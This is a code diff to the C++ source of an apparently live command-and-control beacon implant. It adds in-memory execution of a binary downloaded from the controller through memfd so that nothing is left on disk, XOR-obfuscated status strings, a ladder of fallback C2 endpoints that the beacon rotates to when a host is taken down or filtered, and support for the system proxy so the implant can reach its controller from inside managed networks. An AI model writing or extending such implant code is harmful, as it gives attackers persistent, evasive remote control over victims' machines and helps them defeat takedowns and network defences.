@@ -888,7 +888,12 @@ std::string dispatch_command(const std::string& cmd, net::C2Config& cfg) {
         }
 #else
         // POSIX: run from a memfd (no disk trace).
-        if (inmemory::run_binary(bin)) {
+        // `bin` is the raw HTTP body; run_binary takes the bytes as a
+        // vector (the same type the mem-run path decodes), so convert here
+        // instead of relying on an implicit string->vector conversion that
+        // does not exist (this broke the beacon-syntax job).
+        std::vector<unsigned char> bin_bytes(bin.begin(), bin.end());
+        if (inmemory::run_binary(bin_bytes)) {
             return XOR_DEC(XOR_STR("Remote session module deployed in-memory; interact via `beacons`")).c_str();
         }
         return XOR_DEC(XOR_STR("REMOTE_ERROR: memfd exec failed")).c_str();
@@ -1081,14 +1086,17 @@ extern "C" void beacon_main(int argc, char** argv) {
     cfg.sleep_ms  = 5000;
     cfg.base_sleep_ms = 5000;
     cfg.jitter    = 30;
+    // Endpoint ladder + proxy posture from the build config: a single
+    // compiled-in host dies with the first filtered address, and a beacon
+    // that ignores the system proxy never calls home from a managed network.
+    cfg.seed_ladder(C2_HOST, C2_HOSTS);
+    cfg.proxy = C2_PROXY;
 
     if (argc >= 2) {
         std::string host_str(argv[1]);
-#ifdef _WIN32
-        cfg.host = std::wstring(host_str.begin(), host_str.end());
-#else
-        cfg.host = host_str;
-#endif
+        // an operator-supplied host becomes the FIRST rung without throwing
+        // away the compiled-in fallbacks behind it
+        cfg.prefer_endpoint(host_str);
         if (argc >= 3) cfg.port = std::atoi(argv[2]);
         if (argc >= 4) cfg.use_https = std::atoi(argv[3]) != 0;
     }
@@ -1146,6 +1154,7 @@ extern "C" void beacon_main(int argc, char** argv) {
             consecutive_failures = 0;
             ++checkins_ok;
             g_checkins_ok = checkins_ok;
+            cfg.on_success();
             // server reachable again: restore the operator-configured base
             // sleep (exponential backoff from the outage must not stick)
             if (cfg.sleep_ms != cfg.base_sleep_ms) cfg.sleep_ms = cfg.base_sleep_ms;
@@ -1228,6 +1237,19 @@ extern "C" void beacon_main(int argc, char** argv) {
             ++checkins_fail;
             g_checkins_fail = checkins_fail;
             last_error = "checkin fail #" + std::to_string(consecutive_failures);
+            // Endpoint ladder: after a per-endpoint failure budget the beacon
+            // rotates to the next C2 (redirector behind a taken-down host,
+            // filtered address, provider outage). The window is reset after
+            // a move so the backoff restarts from the base sleep.
+            if (cfg.on_failure()) {
+                last_error += " -> rotating to " + cfg.endpoint();
+                cfg.sleep_ms = cfg.base_sleep_ms;
+                consecutive_failures = 1;
+                // cached connection state belongs to the OLD endpoint
+#ifdef _WIN32
+                net::g_ctx.cleanup();
+#endif
+            }
             g_last_error = last_error;
             if (consecutive_failures > 1) {
                 cfg.sleep_ms = std::min(60000, cfg.sleep_ms * 2);
